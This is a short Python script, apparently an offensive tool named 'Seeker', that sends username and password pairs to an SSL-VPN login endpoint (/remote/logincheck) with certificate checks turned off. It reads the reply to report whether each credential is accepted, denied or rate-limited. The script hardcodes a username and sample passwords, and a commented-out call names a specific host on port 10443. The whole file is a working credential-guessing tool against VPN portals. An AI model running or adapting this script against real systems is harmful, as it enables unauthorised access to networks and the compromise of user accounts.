#Version 0.1
import requests
#Disable Insecure Request Warninng
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
#vars
target = ''''''

proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

#headers vars
headers = { "Accept-Encoding" : "gzip, deflate",
            "Accept" : "*/*",
            "User-Agent" : 'Seeker',
            "Accept-Language": "en-US",
            "Content-Type": "text/plain;charset=UTF-8",
            "Connection": "close"}

data = '''ajax=1&username=jonathan&realm=&credential=guywe'''

req = requests.post(target ,data=data ,headers=headers ,verify=False)
#req = requests.post(target , proxies=proxies, data=data ,headers=headers ,verify=False)

success = ''

denie = 'ret=0,redir=/remote/login?&err=sslvpn_login_permission_denied&lang=en'

def seeker(target:str, user:str, password:str):
    headers = { "Accept-Encoding" : "gzip, deflate",
                "Accept" : "*/*",
                "User-Agent" : 'Seeker',
                "Accept-Language": "en-US",
                "Content-Type": "text/plain;charset=UTF-8",
                "Connection": "close"}
    data = f'ajax=1&username={user}&realm=&credential={password}'
    req = requests.post(target ,data=data ,headers=headers ,verify=False)
    if 'hostcheck' in req.text:
        print('YES')
    elif 'denied' in req.text:
        print('NO')
    else:
        print('Too many requests')

#seeker('https://george-mary.xysstore.com:10443/remote/logincheck','jonathan','etaet')
